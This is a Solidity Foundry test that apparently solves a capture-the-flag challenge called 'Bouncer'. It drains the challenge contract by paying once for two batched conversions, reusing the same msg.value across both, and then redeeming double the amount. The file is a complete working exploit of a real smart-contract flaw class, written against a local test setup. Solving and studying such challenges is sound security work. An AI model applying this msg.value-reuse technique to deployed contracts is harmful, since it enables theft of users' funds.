// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./challenge/Setup.sol";

contract BouncerExploitTest is Test {
    address playerAddress = address(10);
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function testExploit() public {
        vm.deal(playerAddress, 100 ether);
        Setup setup = new Setup{value: 100 ether}();
        vm.startPrank(playerAddress, playerAddress);

        Bouncer bouncer = Bouncer(setup.bouncer());
        uint initialBalance = address(bouncer).balance; 
        uint amount = initialBalance + 2 ether;
        bouncer.enter{value: 1 ether}(ETH, amount); 
        bouncer.enter{value: 1 ether}(ETH, amount); 
        vm.warp(block.timestamp + 1);
        uint[] memory ids = new uint[](2);
        ids[0] = 0;
        ids[1] = 1;
        bouncer.convertMany{value: amount}(playerAddress, ids); 
        bouncer.redeem(ERC20Like(ETH), amount * 2);

        vm.stopPrank();
        assertTrue(setup.isSolved());
    }
}
